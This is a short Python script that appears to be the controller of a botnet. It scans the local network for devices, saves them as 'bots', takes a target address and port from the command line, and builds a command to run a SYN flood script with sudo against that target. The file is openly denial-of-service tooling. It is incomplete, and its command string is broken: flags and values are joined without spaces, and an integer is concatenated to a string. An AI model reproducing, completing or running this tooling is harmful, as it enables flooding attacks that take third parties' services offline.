from scan_device import Scanbot
import sys
import re
import os
import socket
import time
from multiprocessing import Process
from rwList import RW
from command import Command
import argparse

parser = argparse.ArgumentParser()

listip = Scanbot.scan()

Scanbot.display_result(listip)
RW.saveBot(listip)

parser.add_argument('-t','--target', help='Destination address', required=True)
parser.add_argument('-p', '--port', help='Destination Port number', type=int, required=True)
args = parser.parse_args()

command = 'cd && sudo python3 syn_flood.py -t' + args.target + '-p'+ args.port




